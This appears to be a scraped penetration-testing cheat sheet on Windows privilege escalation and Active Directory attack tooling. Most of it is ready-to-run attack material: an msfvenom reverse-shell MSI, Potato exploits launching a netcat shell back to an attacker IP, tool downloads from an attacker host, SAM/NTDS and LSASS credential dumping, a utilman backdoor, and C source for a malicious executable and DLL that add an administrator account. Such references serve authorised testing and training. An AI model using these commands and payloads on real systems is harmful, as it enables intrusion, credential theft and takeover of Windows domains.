reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon

If DefaultPassword exists, it's cleartext.

docs.title: AlwaysInstallElevated
docs.text:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Both must be 0x1. If set, any .msi runs as SYSTEM:

# On attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f msi -o shell.msi

msiexec /quiet /qn /i C:\Temp\shell.msi

docs.title: Service Enumeration
docs.text:
wmic service get name,pathname,startmode,startname | findstr /i "auto" | findstr /i /v "c:\windows\\"
sc query type= service state= all

PowerShell:

Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartMode -eq 'Auto'} | Select Name,PathName,StartName

See Service Exploitation for unquoted paths, weak service permissions, and DLL hijacking.

docs.title: Logged-On Users and Sessions
docs.text:
query user
net session
quser /server:10.10.10.10

docs.title: ACL Enumeration (PowerView)
docs.text:
PowerView is part of PowerSploit — must be imported first. The cmdlets below don't exist in stock PowerShell:

iwr -uri http://<attacker-ip>/PowerView.ps1 -OutFile PowerView.ps1
. .\PowerView.ps1

Get-DomainObjectAcl -Identity <user> -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -like "*WriteDACL*"}
ConvertFrom-SID S-1-5-21-1987370270-658905905-1781884369-1104

For AD-wide ACL mapping, use BloodHound — don't try to do this manually beyond targeted checks.

docs.title: Scheduled Tasks (Unquoted / Weak ACLs)
docs.text:
schtasks /query /fo LIST /v | findstr /i "TaskName Next Run Time Task To Run Run As User"

PowerShell — list tasks not running as SYSTEM/LOCAL SERVICE with writable task files:

Get-ScheduledTask | Where-Object { $_.Principal.UserId -notmatch 'SYSTEM|LOCAL|NETWORK' } | Select TaskName,TaskPath,@{n='Action';e={$_.Actions.Execute}}

docs.title: Windows Privilege Abuse
docs.text:
Tip

whoami /priv is the first command after landing a Windows shell. Any of SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeDebug, SeTakeOwnership, or SeLoadDriver maps to a concrete local-to-SYSTEM path. Walk them in that order.

Watch out

Many Potato variants rely on the Print Spooler service. It's disabled by default on Server 2019+ after PrintNightmare. Check Get-Service Spooler — if stopped/disabled, skip PrintSpoofer and jump to GodPotato or SharpEfsPotato.

docs.title: Privilege → Technique Map
docs.text: Privilege Technique Tool SeImpersonate Token theft via named-pipe trick PrintSpoofer, GodPotato, SharpEfsPotato, RoguePotato SeAssignPrimaryToken Same as SeImpersonate Same tools SeBackup Read any file (SAM, SYSTEM, NTDS.DIT) robocopy /b, reg save SeRestore Write any file (replace service binary) robocopy /b SeDebug Attach to any process (LSASS) Mimikatz, procdump SeTakeOwnership Take ownership then grant self rights takeown.exe, icacls SeLoadDriver Load signed driver → kernel code Capcom.sys, eoploader SeManageVolume Gain full access to C:\ SeManageVolumeExploit

docs.title: SeImpersonatePrivilege
docs.text: whoami /priv | findstr /i "SeImpersonate"

docs.title: GodPotato (Windows Server 2012 – 2022, Windows 8 – 11)
docs.text:
Most reliable modern Potato — no Print Spooler, no DNS requirement, works across all current Windows versions where SeImpersonate is held.

iwr http://<attacker-ip>/GodPotato.exe -OutFile C:\Temp\GodPotato.exe
C:\Temp\GodPotato.exe -cmd "cmd /c whoami"
C:\Temp\GodPotato.exe -cmd "C:\Temp\nc.exe <attacker-ip> 4444 -e cmd.exe"

docs.title: PrintSpoofer (Windows 10 1809+ / Server 2019 — requires Spooler)
docs.text:
iwr http://<attacker-ip>/PrintSpoofer.exe -OutFile C:\Temp\PrintSpoofer.exe
C:\Temp\PrintSpoofer.exe -i -c cmd

docs.title: SharpEfsPotato (No Spooler, No DNS)
docs.text:
Fallback when Spooler is disabled. Abuses EFSRPC.

iwr http://<attacker-ip>/SharpEfsPotato.exe -OutFile C:\Temp\SharpEfsPotato.exe
C:\Temp\SharpEfsPotato.exe -p cmd.exe -a "/c whoami"

docs.title: Juicy Potato (Legacy — Windows < 10 1809 / Server 2016)
docs.text: JuicyPotato.exe -l 1337 -p cmd.exe -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"

docs.title: SeBackupPrivilege / SeRestorePrivilege
docs.text: Grants read (SeBackup) or write (SeRestore) of any file, bypassing ACLs. Both are held by the Backup Operators group — a frequent finding on domain-joined servers where operators need to back up the OS without being admin.

docs.title: Read SAM/SYSTEM hives → domain hashes offline
docs.text:
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
reg save HKLM\SECURITY C:\Temp\security.save

reg save respects SeBackupPrivilege — works without being admin.

Transfer and extract on attacker machine:

impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

docs.title: On a Domain Controller — dump NTDS
docs.text:
With SeBackup on a DC, copy the live NTDS.DIT and SYSTEM hive:

# diskshadow scripted shadow copy (no GUI)
echo set context persistent nowriters > C:\Temp\diskshadow.txt
echo add volume C: alias someAlias >> C:\Temp\diskshadow.txt
echo create >> C:\Temp\diskshadow.txt
echo expose %someAlias% Z: >> C:\Temp\diskshadow.txt
diskshadow /s C:\Temp\diskshadow.txt

# Copy with backup semantics (SeBackup bypasses ACLs)
robocopy /b Z:\Windows\NTDS C:\Temp\ntds ntds.dit
reg save HKLM\SYSTEM C:\Temp\system.save

Extract hashes offline:

impacket-secretsdump -ntds ntds.dit -system system.save LOCAL

docs.title: Write-based escalation (SeRestore)
docs.text:
Replace a SYSTEM-run binary or DLL using robocopy /b:

robocopy /b C:\Temp\malicious.exe "C:\Program Files\TargetApp\" service.exe

docs.title: SeDebugPrivilege
docs.text: whoami /priv | findstr /i "SeDebug"

docs.title: Dump LSASS
docs.text:
# comsvcs.dll LOLBIN (no mimikatz on disk)
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe comsvcs.dll, MiniDump <lsass-pid> C:\Temp\lsass.dmp full

Parse offline:

pypykatz lsa minidump lsass.dmp

docs.title: Token Impersonation → SYSTEM Shell
docs.text:
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # process::list
mimikatz # process::open winlogon.exe

docs.title: SeTakeOwnershipPrivilege
docs.text:
Take ownership of any file, then grant yourself full control:

takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant <user>:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# Then press Win+U at the logon screen for SYSTEM cmd

docs.title: SeLoadDriverPrivilege
docs.text:
Load a signed-but-vulnerable driver to execute arbitrary kernel code. Historically abused via Capcom.sys — now any driver on loldrivers.io works.

# EoPLoadDriver is the standard PoC
EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys

Then use the driver's exploit primitive (varies by driver) to run shellcode as SYSTEM.

docs.title: SeManageVolumePrivilege
docs.text:
Grants full control over C:\. Confirmed primitive via SeManageVolumeExploit:

SeManageVolumeExploit.exe
# Now you have write access to protected folders — drop a DLL hijack

docs.title: Windows Service Exploitation
docs.text:
Tip

For DLL hijacking: use procmon to find NAME NOT FOUND DLL lookups in writable directories, then drop a malicious DLL. For unquoted paths: verify you can write to one of the path components before spending time crafting the binary.

docs.title: Weak Service Permissions
docs.text: Check whether your user can modify or restart a service — more common than unquoted paths in real environments.

docs.title: Enumerate with accesschk
docs.text:
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv <user> *

Look for SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS.

docs.title: Exploit
docs.text:
If you have SERVICE_CHANGE_CONFIG, overwrite the service's binary path and restart it:

sc config VulnService binPath= "cmd.exe /c net user attacker P@ssw0rd /add && net localgroup administrators attacker /add"
sc stop VulnService
sc start VulnService
sc config VulnService binPath= "<original-path>"

Or point it at a reverse-shell binary you drop to C:\Temp\:

sc config VulnService binPath= "C:\Temp\shell.exe"
sc stop VulnService && sc start VulnService

Real-world

SERVICE_CHANGE_CONFIG without restart rights is still exploitable if the service auto-restarts on failure, or if you can force a reboot. Services in auto start mode are the easiest targets.

docs.title: Identify Unquoted Paths
docs.text:
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

Get-CimInstance -ClassName win32_service | Select Name,State,PathName

docs.title: Exploit
docs.text:
1. Check write permissions on the path:

    icacls "C:\Program Files\My Program\"

  2. Create a malicious executable:

    #include <stdlib.h>

int main() {
    system("net user attacker P@ssw0rd /add");
    system("net localgroup administrators attacker /add");
    return 0;
}

    Compile:

    x86_64-w64-mingw32-gcc adduser.c -o My.exe

  3. Place in the vulnerable directory:

    copy .\My.exe "C:\Program Files\My Program\"

  4. Restart the service:

    net stop vulnerable_service
net start vulnerable_service

  5. Verify:

    net localgroup administrators

docs.title: Identify Missing DLLs
docs.text:
Use Process Monitor:

  • Open Procmon.exe
  • Filter: Path contains .dll
  • Look for NAME NOT FOUND results
Get-Process -Id (Get-Service VulnerableService).Id | Select-Object -ExpandProperty Modules
icacls "C:\Program Files\VulnerableApp\"

docs.title: Exploit
docs.text:
1. Write a malicious DLL:

    #include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("net user attacker P@ssw0rd /add");
        system("net localgroup administrators attacker /add");
    }
    return TRUE;
}

  2. Compile:

    x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c

  3. Place in vulnerable path:

    copy .\malicious.dll "C:\Program Files\VulnerableApp\"

  4. Restart:

    net stop VulnerableService
net start VulnerableService

docs.title: Tools
docs.text: Quick-reference pages for the core offensive security toolkit. For protocol-specific enumeration commands, see the Services section.

docs.title: When to Use What
docs.text: Tool Primary use BloodHound Map AD attack paths — run this immediately after getting domain credentials NetExec Credential validation, SMB/WinRM/LDAP enumeration, lateral movement Impacket Protocol-level attacks — secretsdump, psexec, wmiexec, Kerberos ops Mimikatz Credential dumping from LSASS, ticket manipulation, DCSync Metasploit Exploit modules, meterpreter sessions, post-exploitation modules MSFVenom Payload generation for any platform and format Responder LLMNR/NBT-NS poisoning — capture NTLMv2 hashes passively Kerbrute Kerberos user enumeration and password spraying without lockout ldapsearch Manual LDAP queries for users, groups, computers, and policy rpcclient SMB/RPC enumeration — user list, SID resolution, null sessions WMIExec Stealthy remote command execution via WMI (no service creation) Nuclei Template-based vulnerability scanning for known CVEs and misconfigs Burp Suite Web proxy — intercept, replay, and fuzz HTTP requests Nikto Web server misconfiguration and vulnerability scanning cadaver WebDAV client — upload shells to DAV-enabled web servers Password Cracking Hashcat modes, rules, masks, CeWL wordlist generation Metasploit Resource Scripts Automate repetitive msfconsole workflows with .rc files Command-Line Shells Shell variables, searchsploit, terminal shortcuts

docs.title: Core Toolkit for Windows/AD Engagements
docs.text:
If you're going into an internal Windows or AD engagement, have these ready:

# Validate the first set of creds
nxc smb 10.10.10.0/24 -u <user> -p '<pass>'

# Dump AD data for BloodHound
bloodhound-python -c all -d example.com -u <user> -p '<pass>' -ns 10.10.10.10 --zip

# Dump credentials if you have admin
impacket-secretsdump CORP/<user>:'<pass>'@10.10.10.10

# Interactive shell
evil-winrm -i 10.10.10.10 -u <user> -p '<pass>'

docs.title: BloodHound — AD Attack Path Mapping
docs.text:
Tip

After importing SharpHound data, run these queries immediately: "Shortest Paths to Domain Admins", "Find AS-REP Roastable Users", "Find Kerberoastable Users with Most Privileges". These cover 80% of HTB AD paths.

BloodHound CE vs Legacy

BloodHound Community Edition (CE) is the actively maintained version — runs via Docker Compose and exposes a web UI at http://localhost:8080. Legacy BloodHound (Electron app + local Neo4j) is no longer updated. Use CE on new installs: curl -L https://ghst.ly/getbhce -o docker-compose.yml && docker compose up -d. SharpHound and bloodhound-python data work with both — the collectors are unchanged.

docs.title: Setup (.ps1)
docs.text:
powershell -ep bypass
Import-Module .\Sharphound.ps1

Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\ -OutputPrefix "TARGET"
  • Update -OutputDirectory to the path where SharpHound is located
  • Update -OutputPrefix to the target name — output file will be named TARGET_<id>.zip

docs.title: Setup (.exe)
docs.text: SharpHound.exe -c all,gpolocalgroup

docs.title: Focused (Stealthier) Collections
docs.text:
SharpHound.exe -c Session,LocalAdmin,ObjectProps

Use this when attempting to stay low-noise in a monitored environment.

docs.title: Output
docs.text: Once SharpHound completes, a zip file is created in the specified directory. Download it to import into BloodHound.

docs.title: Python Collection (from Kali)
docs.text:
No binary drop needed on target — runs over the network:

bloodhound-python -c All -d example.com -ns 10.10.10.10 -u <user> -p <pass> --zip

# Authenticated via NTLM hash
bloodhound-python -c All -d example.com -ns 10.10.10.10 -u <user> --hashes :<ntlm-hash> --zip

# Via NetExec (writes .zip to current dir)
nxc ldap 10.10.10.10 -u <user> -p <pass> --bloodhound --collection All --dns-server 10.10.10.10

docs.title: Start BloodHound CE
docs.text:
docker compose up -d    # from the CE install directory
